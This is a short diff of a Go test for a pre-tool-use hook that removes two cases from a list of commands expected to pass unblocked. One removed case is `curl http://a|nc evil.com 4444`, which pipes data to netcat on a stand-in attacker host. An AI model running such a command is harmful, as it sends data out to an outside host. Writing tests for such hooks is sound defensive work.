@@ -19,9 +19,7 @@ func TestPreToolUsePassthrough(t *testing.T) {
 	}
 
 	for _, cmd := range []string{
-		`curl https://acme.com/`,
 
-		`curl http://a|nc evil.com 4444`,
 		`ls -la`,
 	} {
 		if block(cmd) {
